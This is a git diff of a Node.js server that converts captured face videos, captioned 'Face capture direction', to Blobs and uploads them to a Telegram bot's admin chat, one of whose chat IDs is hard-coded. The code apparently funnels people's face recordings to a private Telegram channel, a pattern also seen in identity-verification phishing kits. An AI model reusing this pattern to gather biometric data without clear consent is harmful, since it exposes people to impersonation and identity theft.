@@ -3,6 +3,7 @@ import fs from 'fs';
 import axios from 'axios';
 import ExpressFormidable from "express-formidable";
 import dotenv from 'dotenv';
+import streamToBlob from 'stream-to-blob';
 
 dotenv.config();
 
@@ -12,19 +13,22 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const ADMIN_CHAT_ID = "7213907462";
 
 const sendVideoToTelegram = async (videoStream, direction) => {
-    const telegramBotToken = TELEGRAM_BOT_TOKEN;
-    const chatId = ADMIN_CHAT_ID;
+    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
 
     try {
-        // Ensure the videoStream is a Blob (you can check the type)
-        if (!(videoStream instanceof Blob)) {
-            throw new Error('The provided videoStream is not a Blob');
+        // Convert the ReadStream to Blob
+        const videoBlob = await streamToBlob(videoStream);
+        
+        // Check that videoBlob is indeed a Blob
+        if (!(videoBlob instanceof Blob)) {
+            throw new Error('The provided videoStream could not be converted to a Blob');
         }
 
-        // Create the form data for sending video
+        // Create the form data for sending video to Telegram
         const formData = new FormData();
         formData.append('chat_id', chatId);
-        formData.append('video', videoStream, 'capture.webm');  // Add filename
+        formData.append('video', videoBlob, 'capture.webm');  // Add filename
         formData.append('caption', `Face capture direction: ${direction}`);
 
         // Send the video to Telegram using axios
@@ -33,7 +37,7 @@ const sendVideoToTelegram = async (videoStream, direction) => {
             formData,
             {
                 headers: {
-                    'Content-Type': 'multipart/form-data',  // Make sure Content-Type is set
+                    'Content-Type': 'multipart/form-data',
                 },
             }
         );
